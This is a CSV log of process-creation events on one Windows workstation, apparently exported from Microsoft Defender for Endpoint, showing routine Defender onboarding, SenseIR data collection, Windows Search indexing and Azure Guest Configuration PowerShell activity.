Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,DeviceName
"Apr 1, 2025 6:45:29 PM",powershell.exe,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command ""Add-Type 'using System; using System.Diagnostics; using System.Diagnostics.Tracing; namespace Sense { [EventData(Name = \""Onboarding\"")]public struct Onboarding{public string Message { get; set; }} public class Trace {public static EventSourceOptions TelemetryCriticalOption = new EventSourceOptions(){Level = EventLevel.Informational, Keywords = (EventKeywords)0x0000200000000000, Tags = (EventTags)0x0200000}; public void WriteOnboardingMessage(string message){es.Write(\""OnboardingScript\"", TelemetryCriticalOption, new Onboarding {Message = message});} private static readonly string[] telemetryTraits = { \""ETW_GROUP\"", \""{5ECB0BAC-B930-47F5-A8A4-E8253529EDB7}\"" }; private EventSource es = new EventSource(\""Microsoft.Windows.Sense.Client.Management\"",EventSourceSettings.EtwSelfDescribingEventFormat,telemetryTraits);}}'; $logger = New-Object -TypeName Sense.Trace; $logger.WriteOnboardingMessage('Successfully onboarded machine to Microsoft Defender for Endpoint')"" ",cmd.exe,"""cmd.exe"" /C ""C:\Users\johndoe678\Desktop\WindowsDefenderATPLocalOnboardingScript.cmd"" ",sjr-workstation
"Apr 1, 2025 6:45:39 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '049842352aa516cf3e69cc8c34b799faa70bd7e7716ee9ae16d808860d3864c9')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""2976"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk2OH0=""",sjr-workstation
"Apr 1, 2025 6:47:29 PM",SearchProtocolHost.exe,"""SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-511456221-522250981-1472541553-5005_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-511456221-522250981-1472541553-5005 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1""",searchindexer.exe,SearchIndexer.exe /Embedding,sjr-workstation
"Apr 1, 2025 6:55:28 PM",SearchProtocolHost.exe,"""SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",searchindexer.exe,SearchIndexer.exe /Embedding,sjr-workstation
"Apr 1, 2025 6:56:49 PM",SearchProtocolHost.exe,"""SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe7_ Global\UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",searchindexer.exe,SearchIndexer.exe /Embedding,sjr-workstation
"Apr 1, 2025 6:57:04 PM",powershell.exe,"powershell.exe ""powershell -ExecutionPolicy RemoteSigned -File 'C:\ProgramData\GuestConfig\downloads\AzureWindowsBaseline\pre_install.ps1';""",gc_service.exe,"""gc_service.exe"" -k netsvcs",sjr-workstation
"Apr 1, 2025 6:57:10 PM",powershell.exe,"""powershell.exe"" -ExecutionPolicy RemoteSigned -File C:\ProgramData\GuestConfig\downloads\AzureWindowsBaseline\pre_install.ps1",powershell.exe,"powershell.exe ""powershell -ExecutionPolicy RemoteSigned -File 'C:\ProgramData\GuestConfig\downloads\AzureWindowsBaseline\pre_install.ps1';""",sjr-workstation
"Apr 1, 2025 6:58:38 PM",powershell.exe,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml",gc_worker.exe,gc_worker.exe -a WindowsDefenderExploitGuard -c Pending -s inguest -g https://eastus2-gas.guestconfiguration.azure.com/virtualMachines/eb27f8c1-9211-4384-9abe-12b323d68e07,sjr-workstation
"Apr 1, 2025 6:58:53 PM",powershell.exe,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml",gc_worker.exe,gc_worker.exe -a WindowsDefenderExploitGuard -c Pending -s inguest -g https://eastus2-gas.guestconfiguration.azure.com/virtualMachines/eb27f8c1-9211-4384-9abe-12b323d68e07,sjr-workstation
"Apr 1, 2025 6:59:08 PM",powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,sjr-workstation
